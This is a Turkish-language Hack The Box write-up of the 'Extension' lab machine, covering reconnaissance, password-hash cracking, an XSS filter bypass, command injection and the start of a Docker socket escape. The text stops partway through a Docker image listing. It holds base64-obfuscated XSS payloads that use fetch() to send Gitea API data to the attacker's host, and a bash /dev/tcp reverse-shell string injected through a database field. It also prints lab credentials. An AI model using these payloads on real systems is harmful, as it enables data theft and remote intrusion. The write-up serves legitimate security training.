---

title: 🔴 HTB - Extension
author: Acivik
date: 2023-03-18 18:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, extension, walktrough, hard, linux]

---

![https://i.ibb.co/CMP4TW1/Extension.png](https://i.ibb.co/CMP4TW1/Extension.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

`Nmap` taraması 22 ssh ve 80 http olmak üzere iki adet açık port buldu.

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# nmap -p- 10.10.11.171 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-03 06:44 EST
Nmap scan report for snippet.htb (10.10.11.171)
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 41.85 seconds
root@acivik:~/ctfs/Extension-10.10.11.171# nmap -p22,80 10.10.11.171 -sVC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-03 06:45 EST
Nmap scan report for snippet.htb (10.10.11.171)
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8221e2a5824ddf3f99db3ed9b3265286 (RSA)
|   256 913ab2922b637d91f1582b1b54f9703c (ECDSA)
|_  256 6520392ba73b33e5ed49a9acea01bd37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: snippet.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
root@acivik:~/ctfs/Extension-10.10.11.171#
```

Openssh sürümüne göre hedef makine üzerinde `Ubuntu bionic 18.04` işletim sistemi çalışıyor olabilir.
Ayrıce `http-title` olarak `snippet.htb` adresini görüyorum `/etc/hosts` dosyasına kaydedeceğim.

## <span style="color:#0096FF">VirtualHost Scan</span>

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://snippet.htb/ -H "Host: FUZZ.snippet.htb" --hw 896
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000002:   200        96 L     331 W      5311 Ch     "mail"                                                                                                     
000000019:   200        249 L    1197 W     12729 Ch    "dev"
```

Bulduğum vhostları da hosts dosyasına kaydedeceğim.

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">Web Sitesi - snippet.htb - 80/tcp HTTP</span>

Web sayfası, ekip üyelerinin dışında pek bilgi vermiyor.

![https://i.ibb.co/vX1JnCR/image.png](https://i.ibb.co/vX1JnCR/image.png)

Dizin taraması yaparak farklı şeyler bulmaya çalışacağım.

### <span style="color:#FFC300">Directory Brute Force</span>

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# dirsearch -u http://snippet.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/snippet.htb/-_23-01-03_08-31-10.txt

Error Log: /root/.dirsearch/logs/errors-23-01-03_08-31-10.log

Target: http://snippet.htb/

[08:31:10] Starting:
[08:31:11] 301 -  307B  - /js  ->  http://snippet.htb/js/
[08:32:22] 405 -  825B  - /_ignition/execute-solution
[08:34:03] 301 -  308B  - /css  ->  http://snippet.htb/css/
[08:34:05] 302 -  342B  - /dashboard  ->  http://snippet.htb/login
[08:34:24] 200 -    0B  - /favicon.ico
[08:34:39] 403 -  276B  - /images/
[08:34:39] 301 -  311B  - /images  ->  http://snippet.htb/images/
[08:34:43] 200 -   37KB - /index.php
[08:34:49] 403 -  276B  - /js/
[08:34:58] 200 -   37KB - /login
[08:35:00] 405 -  825B  - /logout
[08:35:15] 302 -  342B  - /new  ->  http://snippet.htb/login
[08:35:43] 200 -   37KB - /register
[08:35:49] 403 -  276B  - /server-status
[08:35:49] 403 -  276B  - /server-status/
[08:36:18] 302 -  342B  - /users  ->  http://snippet.htb/login
[08:36:24] 200 -    1KB - /web.config
```

Tüm dosya, dizinleri inceledim ve işe yarar bir şey bulamadım. HTML kaynak kodlarında bir şeyler bulmaya çalışacağım.

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# curl -s http://snippet.htb/ | grep -i 'const Ziggy' | sed 's/ const Ziggy = //' | jq 2>/dev/null | grep -i 'uri'
      "uri": "_ignition/health-check",
      "uri": "_ignition/execute-solution",
      "uri": "_ignition/share-report",
      "uri": "_ignition/scripts/{script}",
      "uri": "_ignition/styles/{style}",
      "uri": "dashboard",
      "uri": "users",
      "uri": "snippets",
      "uri": "snippets/{id}",
      "uri": "snippets/update/{id}",
      "uri": "snippets/update/{id}",
      "uri": "snippets/delete/{id}",
      "uri": "new",
      "uri": "management/validate",
      "uri": "management/dump",
      "uri": "register",
      "uri": "login",
      "uri": "forgot-password",
      "uri": "forgot-password",
      "uri": "reset-password/{token}",
      "uri": "reset-password",
      "uri": "verify-email",
      "uri": "verify-email/{id}/{hash}",
      "uri": "email/verification-notification",
      "uri": "confirm-password",
      "uri": "logout",
root@acivik:~/ctfs/Extension-10.10.11.171#
```

Biraz daha endpoint elde ettik. `/management/dump` POST iseteklerini kabul eden bir endpointtir.
Ona istek gönderdiğimde dönen yanıt:

```json
{"code":400,"message":"Missing arguments"}
```

Bizden doğru json argümanı sunmamızı istiyor. Doğru değeri bulabilmek için önce `key` sonra `value` için brute force yapacağım.

```json
{"download":"users"}
```

Gelen yanıtta bir çok kullanıcının kimlik bilgileri yer alıyor.

![https://i.ibb.co/JRxh8DV/image.png](https://i.ibb.co/JRxh8DV/image.png)

Parolalar sha256 ile şifrelenmiş. John aracılığıyla kırılabilecek şifreleri kırmaya çalışacağım.

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# john hashs.txt --format=Raw-SHA256 -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 892 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     

root@acivik:~/ctfs/Extension-10.10.11.171# cat ~/.john/john.pot 
$SHA256$ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
root@acivik:~/ctfs/Extension-10.10.11.171#
```

Parolanın ait olduğu kullanıcı adını bulmak gerekiyor.

```bash
"email":"letha@snippet.htb","password":"ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
"email":"fredrick@snippet.htb","password":"ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
"email":"gia@snippet.htb","password":"ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
"email":"juliana@snippet.htb","password":"ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
```

Bu dört kullanıcının da parolası `password123` . Yani herhangi biriyle giriş yapabilirim.

![https://i.ibb.co/gZSJzz7/image.png](https://i.ibb.co/gZSJzz7/image.png)

“Browse Snippets” sekmesinde oluşturulan snippetlar görünür.

![https://i.ibb.co/TqtjzXw/image.png](https://i.ibb.co/TqtjzXw/image.png)

Sadece bir tane görünüyor ve id değeri 1. Başka var mı diye 1 değerini 2-3 vs. değiştireceğim.
`/snippets/2` de farklı bir şey buluyorum.

![https://i.ibb.co/h8FmGkn/image.png](https://i.ibb.co/h8FmGkn/image.png)

Görüntüleme yetkimin olmadığı söyleniyor.

`"uri": "snippets/update/{id}"` bu yolu kullanarak denedim ve içeriği görüntülemeyi başardım.

Content kısmında `jean` kullanıcısı için bir `curl` komutu bulunuyor.

```bash
curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H 'accept: application/json' -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'
```

Bulduğumuz authorization değerini base64 ile decode edeceğim.

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# echo "amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB" | base64 -d
jean:EHmfar1Y7ppA9O5TAIXnYnJpA
```

Kullanıcı bilgileri `mail.snippet.htb` ve `dev.snippet.htb` için geçerlidir. Fakat mail oturumunun içerisi tamamen boş ve sürüm bilgisine baktım zafiyet bulunmuyor. Bu yüzden dev.snippet.htb adresinden devam edeceğim.

## <span style="color:#0096FF">Web Sitesi - dev.snippet.htb - 80/tcp HTTP</span>

![https://i.ibb.co/34RF4tC/image.png](https://i.ibb.co/34RF4tC/image.png)

`jean:EHmfar1Y7ppA9O5TAIXnYnJpA` ile giriş yaptım.
Jean kullanıcısına ait bir repository bulunuyor.

![https://i.ibb.co/ZNY3s6P/image.png](https://i.ibb.co/ZNY3s6P/image.png)

İçerisinde `inject.js` dosyası yer alıyor. Dosyanın içeriğini aşağıdaki gibidir.

```jsx
/**
 * @param str
 * @returns {string|*}
 */
function check(str) {

    // remove tags
    str = str.replace(/<.*?>/, "")

    const filter = [";", "\'", "(", ")", "src", "script", "&", "|", "[", "]"]

    for (const i of filter) {
        if (str.includes(i))
            return ""
    }

    return str

}
```

Check fonksiyonunda xss zafiyeti bulunuyor. Yapılan filtreler güvenli değil yani bypass edilebilir.
Oluşturulan ilk tag silinir bu yüzden önce boş tag yazabiliriz.
Yeni bir issue oluşturdum.

```jsx
acivik<acivik><img SRC="http://10.10.14.73/acivik.jpg">
```

Bir süre bekledikten sonra gelen isteği netcat dinleyicimden görebiliyorum.

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.14.73] 42988
GET /acivik.jpg HTTP/1.1
Host: 10.10.14.73
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

# <span style="color:#AA0E1C"><b># Foothold - Shell as charlie</b>

Gitea apilerinden veri almak için fetch() kullanacağım. Aynı zamanda parantez karakterlerini de bypasslamam gerekiyor. Oluşturduğum payloadlar aşağıdaki gibidir.

```jsx
Base64 payload -> fetch('http://10.10.14.73/')
acivik<acivik><img SRC="x" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC43My8nKQo=`\x29"}`>

Base64 payload -> fetch('http://dev.snippet.htb/api/v1/users/charlie/repos').then(response => response.text()).then(data => fetch('http://10.10.14.73/'+btoa(data)))
acivik<acivik><img SRC="x" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3VzZXJzL2NoYXJsaWUvcmVwb3MnKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbihkYXRhID0+IGZldGNoKCdodHRwOi8vMTAuMTAuMTQuNzMvJytidG9hKGRhdGEpKSkg`\x29"}`>
```

Hedef apisinden json verisini alıp kendi hostuma göndertmeye çalışıyorum. Doğru payloadı bulana kadar neler yaşadım bir bilseniz…

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# php -S 0.0.0.0:80
[Wed Jan  4 13:03:55 2023] PHP 8.1.12 Development Server (http://0.0.0.0:80) started
[Wed Jan  4 13:07:19 2023] 10.10.11.171:49242 Accepted
[Wed Jan  4 13:07:19 2023] 10.10.11.171:49242 [404]: GET /W3siaWQiOjIsIm93bmVyIjp7ImlkIjozLCJsb2dpbiI6ImNoYXJsaWUiLCJmdWxsX25hbWUiOiIiLCJlbWFpbCI6ImNoYXJsaWVAc25pcHBldC5odGIiLCJhdmF0YXJfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi91c2VyL2F2YXRhci9jaGFybGllLy0xIiwibGFuZ3VhZ2UiOiIiLCJpc19hZG1pbiI6ZmFsc2UsImxhc3RfbG9naW4iOiIwMDAxLTAxLTAxVDAwOjAwOjAwWiIsImNyZWF0ZWQiOiIyMDIxLTEyLTI3VDAwOjA1OjU5WiIsInJlc3RyaWN0ZWQiOmZhbHNlLCJhY3RpdmUiOmZhbHNlLCJwcm9oaWJpdF9sb2dpbiI6ZmFsc2UsImxvY2F0aW9uIjoiIiwid2Vic2l0ZSI6IiIsImRlc2NyaXB0aW9uIjoiIiwidmlzaWJpbGl0eSI6InB1YmxpYyIsImZvbGxvd2Vyc19jb3VudCI6MCwiZm9sbG93aW5nX2NvdW50IjowLCJzdGFycmVkX3JlcG9zX2NvdW50IjowLCJ1c2VybmFtZSI6ImNoYXJsaWUifSwibmFtZSI6ImJhY2t1cHMiLCJmdWxsX25hbWUiOiJjaGFybGllL2JhY2t1cHMiLCJkZXNjcmlwdGlvbiI6IkJhY2t1cCBvZiBteSBob21lIGRpcmVjdG9yeSIsImVtcHR5IjpmYWxzZSwicHJpdmF0ZSI6dHJ1ZSwiZm9yayI6ZmFsc2UsInRlbXBsYXRlIjpmYWxzZSwicGFyZW50IjpudWxsLCJtaXJyb3IiOmZhbHNlLCJzaXplIjoyNCwiaHRtbF91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3VwcyIsInNzaF91cmwiOiJnaXRAbG9jYWxob3N0OmNoYXJsaWUvYmFja3Vwcy5naXQiLCJjbG9uZV91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3Vwcy5naXQiLCJvcmlnaW5hbF91cmwiOiIiLCJ3ZWJzaXRlIjoiIiwic3RhcnNfY291bnQiOjAsImZvcmtzX2NvdW50IjowLCJ3YXRjaGVyc19jb3VudCI6MSwib3Blbl9pc3N1ZXNfY291bnQiOi0zOCwib3Blbl9wcl9jb3VudGVyIjowLCJyZWxlYXNlX2NvdW50ZXIiOjAsImRlZmF1bHRfYnJhbmNoIjoibWFzdGVyIiwiYXJjaGl2ZWQiOmZhbHNlLCJjcmVhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyMjoxNloiLCJ1cGRhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyNDozMFoiLCJwZXJtaXNzaW9ucyI6eyJhZG1pbiI6dHJ1ZSwicHVzaCI6dHJ1ZSwicHVsbCI6dHJ1ZX0sImhhc19pc3N1ZXMiOnRydWUsImludGVybmFsX3RyYWNrZXIiOnsiZW5hYmxlX3RpbWVfdHJhY2tlciI6dHJ1ZSwiYWxsb3dfb25seV9jb250cmlidXRvcnNfdG9fdHJhY2tfdGltZSI6dHJ1ZSwiZW5hYmxlX2lzc3VlX2RlcGVuZGVuY2llcyI6dHJ1ZX0sImhhc193aWtpIjp0cnVlLCJoYXNfcHVsbF9yZXF1ZXN0cyI6dHJ1ZSwiaGFzX3Byb2plY3RzIjp0cnVlLCJpZ25vcmVfd2hpdGVzcGFjZV9jb25mbGljdHMiOmZhbHNlLCJhbGxvd19tZXJnZV9jb21taXRzIjp0cnVlLCJhbGxvd19yZWJhc2UiOnRydWUsImFsbG93X3JlYmFzZV9leHBsaWNpdCI6dHJ1ZSwiYWxsb3dfc3F1YXNoX21lcmdlIjp0cnVlLCJkZWZhdWx0X21lcmdlX3N0eWxlIjoibWVyZ2UiLCJhdmF0YXJfdXJsIjoiIiwiaW50ZXJuYWwiOmZhbHNlLCJtaXJyb3JfaW50ZXJ2YWwiOiIifV0K - No such file or directory
[Wed Jan  4 13:07:19 2023] 10.10.11.171:49242 Closing

base64 decoding -> [{"id":2,"owner":{"id":3,"login":"charlie","full_name":"","email":"charlie@snippet.htb","avatar_url":"http://dev.snippet.htb/user/avatar/charlie/-1","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2021-12-27T00:05:59Z","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"charlie"},"name":"backups","full_name":"charlie/backups","description":"Backup of my home directory","empty":false,"private":true,"fork":false,"template":false,"parent":null,"mirror":false,"size":24,"html_url":"http://dev.snippet.htb/charlie/backups","ssh_url":"git@localhost:charlie/backups.git","clone_url":"http://dev.snippet.htb/charlie/backups.git","original_url":"","website":"","stars_count":0,"forks_count":0,"watchers_count":1,"open_issues_count":-38,"open_pr_counter":0,"release_counter":0,"default_branch":"master","archived":false,"created_at":"2022-01-04T21:22:16Z","updated_at":"2022-01-04T21:24:30Z","permissions":{"admin":true,"push":true,"pull":true},"has_issues":true,"internal_tracker":{"enable_time_tracker":true,"allow_only_contributors_to_track_time":true,"enable_issue_dependencies":true},"has_wiki":true,"has_pull_requests":true,"has_projects":true,"ignore_whitespace_conflicts":false,"allow_merge_commits":true,"allow_rebase":true,"allow_rebase_explicit":true,"allow_squash_merge":true,"default_merge_style":"merge","avatar_url":"","internal":false,"mirror_interval":""}]
```

Charlie’nin reposu hakkındaki bilgiler bize şunu söyler: backups adında bir repo var ve açıklamasında charlie’nin home dizini yazıyor. Branch ise default yani master.
Reponun içeriğini görmek için aşağıdaki payloadı gönderdim.

```jsx
acivik<acivik><img SRC="x" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC43My8nK2J0b2EoZGF0YSkpKSA=`\x29"}`>

[{"name":"backup.tar.gz","path":"backup.tar.gz","sha":"c25cb9d1f1d83bdad41dad403874c2c9b91d0b57","type":"file","size":4316,"encoding":null,"content":null,"target":null,"url":"http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master","html_url":"http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz","git_url":"http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57","download_url":"http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz","submodule_git_url":null,"_links":{"self":"http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master","git":"http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57","html":"http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz"}}]
```

backup.tar.gz adında bir dosya bulunuyor.
dosyanın içeriğini almaya çalışacağım.

```jsx
acivik<acivik><img SRC="x" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cy9iYWNrdXAudGFyLmd6JykudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjczLycrYnRvYShkYXRhKSkpIA==`\x29"}`>

echo 'Gelen_Base64_Kodu' | base64 -d | jq | grep -i content | grep -v url | grep -v self | awk -F ': ' '{print $2}' | tr -d '",' | base64 -d > backup.tar.gz
```

Dosyayı açtığımda gördüğüm şey charlie’nin home dizini ve çerisindeki ssh keyi.

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# ssh -i id_rsa charlie@snippet.htb
charlie@extension:~$ whoami
charlie
charlie@extension:~$ id
uid=1001(charlie) gid=1001(charlie) groups=1001(charlie)
charlie@extension:~$
```

# <span style="color:#AA0E1C"><b># PrivEsc: charlie → jean</b></span>

Öncesinde zaten jean’e ait bir parolaya sahiptim. Geçiş yapmak için onu denemekten zarar gelmez.

```bash
charlie@extension:~$ su jean
Password: EHmfar1Y7ppA9O5TAIXnYnJpA
jean@extension:/home/charlie$ whoami
jean
jean@extension:/home/charlie$ id
uid=1000(jean) gid=1000(jean) groups=1000(jean)
jean@extension:/home/charlie$
```

Jean’in home dizininde projeler dizini bulunuyor. İncelenecek çok dosya var.

```bash
jean@extension:~/projects/laravel-app/app/Http/Controllers$ cat AdminController.php 
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Validation\ValidationException;

class AdminController extends Controller
{

    /**
     * @throws ValidationException
     */
    public function validateEmail(Request $request)
    {
        $sec = env('APP_SECRET');

        $email = urldecode($request->post('email'));
        $given = $request->post('cs');
        $actual = hash("sha256", $sec . $email);

        $array = explode("@", $email);
        $domain = end($array);

        error_log("email:" . $email);
        error_log("emailtrim:" . str_replace("\0", "", $email));
        error_log("domain:" . $domain);
        error_log("sec:" . $sec);
        error_log("given:" . $given);
        error_log("actual:" . $actual);

        if ($given !== $actual) {
            throw ValidationException::withMessages([
                'email' => "Invalid signature!",
            ]);
        } else {
            $res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'");
            return Redirect::back()->with('message', trim($res));
        }

    }
}
```

Email datası alınıyor @ işaretinden bölerek domain değişkenini elde ediyor ve ona ping atıyor. Burada command injection zafiyeti görünüyor.
Ayrıca eklemeyi unutmuşum laravel-app adında bir docker container bulunuyor. Komut enjeksiyonu ile birlikte container içerisinden bir shell alabiliriz.

# <span style="color:#AA0E1C"><b># Shell as application in Container</b></span>

pspy aracını çalıştırdığımda mysql için kimlik bilgisi elde ettim.

```bash
2023/01/04 20:15:02 CMD: UID=0    PID=44036  | sh -c mysql -u root -ptoor --database webapp --execute "delete from snippets where id > 2;"
```

Hedef sistem üzerinde mysql komutu olmadığı için ssh ile port forwarding yapacağım.

```bash
-> ssh -L 1337:localhost:3306 -i id_rsa charlie@snippet.htb

root@acivik:~/ctfs/Extension-10.10.11.171# mysql -u root -ptoor -P 1337
WARNING: Forcing protocol to  TCP  due to option specification. Please explicitly state intended protocol.
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 85
Server version: 5.6.51 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Mysql içersinde users tablosundan başka işe yarar bir şey yok.
Kullanıcılara baktığımda charlie’nin manager rolünde olduğunu görüyorum. Diğer kullanıcılar sadece üye.
Charlie’nin parolasını `password123` sha256 değeri ile değiştireceğim.

```bash
MySQL [webapp]> select id,name,email,password,user_type from users where id = 1;
+----+----------------+---------------------+------------------------------------------------------------------+-----------+
| id | name           | email               | password                                                         | user_type |
+----+----------------+---------------------+------------------------------------------------------------------+-----------+
|  1 | Charlie Rooper | charlie@snippet.htb | 30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82 | Manager   |
+----+----------------+---------------------+------------------------------------------------------------------+-----------+
1 row in set (0.064 sec)

MySQL [webapp]> update users set password='ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f' where id = 1;
Query OK, 1 row affected (0.061 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [webapp]>
```

Giriş yaptığımda üyeler sekmesinde farklı olarak validate butonunu görüyorum. Payloadı tetiklemek için bunu kullanacağım.
![https://i.ibb.co/vB6FXGG/image.png](https://i.ibb.co/vB6FXGG/image.png)
İlk sırada kaleigh olduğu için onun üzerinde test yapacağım.

```bash
MySQL [webapp]> select id,name,email,password,user_type from users where email = 'kaleigh@snippet.htb';
+-----+----------------+---------------------+------------------------------------------------------------------+-----------+
| id  | name           | email               | password                                                         | user_type |
+-----+----------------+---------------------+------------------------------------------------------------------+-----------+
| 895 | Kaleigh Lehner | kaleigh@snippet.htb | 02d2f1d50203951f81c99ec9eedc82ed65c6747dc13c07a945525215e3fe4b01 | Member    |
+-----+----------------+---------------------+------------------------------------------------------------------+-----------+
1 row in set (0.062 sec)

MySQL [webapp]> update users set email="acivik@acivik|bash -c 'exec bash -i &>/dev/tcp/10.10.14.73/4242 <&1'&" where id = 895;
Query OK, 1 row affected (0.064 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [webapp]>
```

Yapılan değişikliği görebiliyorum. Validate butonuna tıklayıp netcat dinleyicimi kontrol edeceğim.
![https://i.ibb.co/DKGHZXn/image.png](https://i.ibb.co/DKGHZXn/image.png)
Container içerisinden shell elde ettim.

```bash
root@acivik:~/ctfs/Extension-10.10.11.171# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.171] 41532
bash: cannot set terminal process group (45): Inappropriate ioctl for device
bash: no job control in this shell
application@4dae106254bf:/var/www/html/public$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: Shell as root on host</b></span>

Linpeas scriptini çalıştırdım.

```bash
╔══════════╣ Interesting Files Mounted
...
tmpfs on /app/docker.sock type tmpfs (rw,nosuid,noexec,relatime,size=401324k,mode=755)
...
╔══════════╣ Readable files belonging to root and readable by me but not world readable
srw-rw---- 1 root app 0 Jan  4 18:07 /app/docker.sock
```

docker socketi üzerinde okuma ve yazma yetkim bulunuyor. Bunu kullanarak escape işlemi yapabilirim.
Bir süre google araması ile ulaştığım dökümanlar.

[The Danger of Exposing Docker.Sock](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

[Exploit docker.sock to mount root filesystem in a container](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25)

mevcut image’leri görebilmek için aşağıdaki komutu girdim. `laravel-app_main`

```bash
application@4dae106254bf:/tmp$ curl -s --unix-socket /app/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1656086146,"Id":"sha256:b97d15b16a2172a201a80266877a65a44b0d7fa31c29531c20cdcc8e98c2d227","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"sha256:762bfd88e0120a1018e9a4ccbe56d654c27418c7183ff4a817346fd2ac8b69af","RepoDigests":null,"RepoTags":["laravel-app_main:latest"],"SharedSize":-1,"Size":1975239137,"VirtualSize":1975239137},
{"Containers":-1,"Created":1655515586,"Id":"sha256:ca37554c31eb2513cf4b1295d854589124f8740368842be843d2b4324edd4b8e","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"","RepoDigests":null,"RepoTags":["webdevops/php-apache:7.4"],"SharedSize":-1,"Size":1028279761,"VirtualSize":1028279761},
{"Containers":-1,"Created":1640902141,"Id":"sha256:6af04a6ff8d579dc4fc49c3f3afcaef2b9f879a50d8b8a996db2ebe88b3983ce","Labels":{"maintainer":"Thomas Bruederli <thomas@roundcube.net>"},"ParentId":"","RepoDigests":["roundcube/roundcubemail@sha256:f5b054716e2fdf06f4c5dbee70bc6e056b831ca94508ba0fc1fcedc8c00c5194"],"RepoTags":["roundcube/roundcubemail:latest"],"SharedSize":-1,"Size":612284073,"VirtualSize":612284073},
{"Containers":-1,"Created":1640805761,"Id":"sha256:c99e357e6daee694f9f431fcc905b130f7a246d8c172841820042983ff8df705","Labels":null,"ParentId":"","RepoDigests":["composer@sha256:5e0407cda029cea056de126ea1199f351489e5835ea092cf2edd1d23ca183656"],"RepoTags":["composer:latest"],"SharedSize":-1,"Size":193476514,"VirtualSize":193476514},
{"Containers":-1,"Created":1640297121,"Id":"sha256:cec4e9432becb39dfc2b911686d8d673b8255fdee4a501fbc1bda87473fb479d","Labels":{"org.opencontainers.image.authors":"The Docker Mailserver Organization on GitHub","org.opencontainers.image.description":"A fullstack but simple mail server (SMTP, IMAP, LDAP, Antispam, Antivirus, etc.). Only configuration files, no SQL database.","org.opencontainers.image.documentation":"https://github.com/docker-mailserver/docker-mailserver/blob/master/README.md","org.opencontainers.image.licenses":"MIT","org.opencontainers.image.revision":"061bae6cbfb21c91e4d2c4638d5900ec6bee2802","org.opencontainers.image.source":"https://github.com/docker-mailserver/docker-mailserver","org.opencontainers.image.title":"docker-mailserver","org.opencontainers.image.url":"https://github.com/docker-mailserver","org.opencontainers.image.vendor":"The Docker Mailserver Organization","org.opencontainers.image.version":"refs/tags/v10.4.0"},"ParentId":"","RepoDigests":["mailserver/docker-mailserver@sha256:80d4cff01d4109428c06b33ae8c8af89ebebc689f1fe8c5ed4987b803ee6fa35"],"RepoTags":["mailserver/docker-mailserver:latest"],"SharedSize":-1,"Size":560264926,"VirtualSize":560264926},
{"Containers":-1,"Created":1640059378,"Id":"sha256:badd93b4fdf82c3fc9f2c6bc12c15da84b7635dc14543be0c1e79f98410f4060","Labels":{"maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2021-12-21T03:59:32Z","org.opencontainers.image.revision":"877040e6521e48c363cfe461746235dce4ab822b","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"},"ParentId":"","RepoDigests":["gitea/gitea@sha256:eafb7459a4a86a0b7da7bfde9ef0726fa0fb64657db3ba2ac590fec0eb4cdd0c"],"RepoTags":["gitea/gitea:1.15.8"],"SharedSize":-1,"Size":148275092,"VirtualSize":148275092},
